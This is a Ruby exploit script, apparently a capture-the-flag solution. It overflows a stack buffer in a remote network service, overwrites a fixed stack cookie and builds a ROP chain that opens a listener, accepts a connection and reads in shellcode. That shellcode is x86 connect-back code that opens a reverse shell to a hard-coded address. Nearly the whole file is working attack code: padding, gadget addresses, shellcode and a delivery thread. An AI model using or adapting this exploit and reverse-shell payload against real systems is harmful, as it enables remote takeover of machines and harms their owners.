require 'socket'

Thread.abort_on_exception = true

IPADDR = "\xc0\x9b\x51\x56"

SHELLCODE = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" + IPADDR + "\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
COOKIE    = "\xe4\xff\xff\xe4"

PPPPR        = "\x85\x9b\x04\x08"
PPPR         = "\x86\x9b\x04\x08"
PPR          = "\x87\x9b\x04\x08"
PR           = "\x88\x9b\x04\x08"
SGNET_LISTEN = "\x20\x94\x04\x08"
ACCEPT       = "\x40\x8a\x04\x08"
RECV         = "\xb0\x8b\x04\x08"
READ         = "\x90\x89\x04\x08"
WRITE        = "\xf0\x8a\x04\x08"

# Just somewhere writeable, and maybe +x
#SOME_STACK       = WRITE

WRITEABLE        = "\x00\xb2\x04\x08"

#s = TCPSocket.new("192.168.1.136", 4242)
s = TCPSocket.new("54.233.105.81", 4242)

sleep(0.1)
puts(s.recv(1024))
s.write("X\n")

sleep(0.1)
puts(s.recv(1024))

data = ""

cookie_offset = 103

while(data.length < cookie_offset)
  data += "A"
end

# Fix the cookie + padding
data += COOKIE
data += "AAAA"               # Stored EBP

# First step in ROP chain: create a new socket and listen on it
# (using the built-in sgnet_listen() function on the one non-firewalled port: 5555)
# This will open socket fd 3 (the lowest available, as per the spec)
data += SGNET_LISTEN       # Return address
data += PPPR               # Pop/pop/pop/ret
data += "\xb3\x15\x00\x00" # Port 5555
data += "\x06\x00\x00\x00" # Protocol
data += "\x00\x00\x00\x00" # Host, I think?

# Accept the connection, which will deliver our shellcode. This will create it as
# socket 4 (the lowest available, as always)
data += ACCEPT
data += PPPR
data += "\x03\x00\x00\x00" # s
data += "\x00\x00\x00\x00" # addr
data += "\x00\x00\x00\x00" # addrlen

# Read the shellcode from the socket into some handy writeable memory (destroying
# the PLT in the process :) ), and return to it
data += READ
data += WRITEABLE
data += "\x04\x00\x00\x00" # s
data += WRITEABLE                # buf
data += "\xFF\x00\x00\x00" # len

# Deliver the shellcode via a new connection on port 5555
SHELLCODE_DELIVERY = Thread.new() do
  sleep(2)
  scd = TCPSocket.new("54.233.105.81", 5555)
  scd.write(SHELLCODE)
  scd.close()
end

# Keep writing the data till it works (there are a bunch of annoying sleep() calls, this
# fixes them)
loop do
  s.write(data + "\n")
  puts(s.recv(1024))
end
